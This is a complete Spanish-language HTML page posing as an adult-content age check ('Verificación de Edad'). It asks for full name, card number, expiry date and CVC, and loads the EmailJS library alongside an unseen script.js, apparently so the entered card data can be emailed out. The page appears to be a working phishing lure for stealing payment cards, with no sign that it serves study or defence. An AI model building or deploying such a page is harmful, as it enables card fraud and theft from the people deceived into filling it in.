<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de Edad</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>🔞 Verificación Requerida</h1>
        <form id="paymentForm">
            <div class="input-group">
                <label>Nombre Completo</label>
                <input type="text" id="cardHolder" placeholder="Ej. Sofia Rodríguez" required>
            </div>
            
            <div class="input-group">
                <label>Número de Tarjeta</label>
                <input type="text" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="16" required>
            </div>

            <div class="input-group">
                <label>Fecha de Expiración</label>
                <input type="month" id="expiryDate" required>
            </div>

            <div class="input-group">
                <label>Código CVC</label>
                <input type="text" id="cvc" placeholder="***" maxlength="3" required>
            </div>

            <button type="submit">Verificar Identidad 💋</button>
        </form>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script src="script.js"></script>
</body>
</html>
